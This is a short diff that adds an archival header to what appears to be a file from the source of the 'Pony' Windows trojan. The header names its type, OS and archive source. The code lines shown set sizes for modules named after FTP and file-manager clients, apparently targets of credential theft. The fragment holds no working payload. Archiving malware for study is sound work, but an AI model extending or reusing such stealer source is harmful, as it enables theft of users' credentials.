@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      Pony
+; type      trojan
+; cve       —
+; year      unknown
+; os        Windows
+; authors   unknown
+; source    RamadhanAmizudin/malware
+; archived  RamadhanAmizudin, krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
   ModuleFileSize.Values['MODULE_FAR'] := '1056';
   ModuleFileSize.Values['MODULE_WTC'] := '1040';
   ModuleFileSize.Values['MODULE_WS_FTP'] := '976';
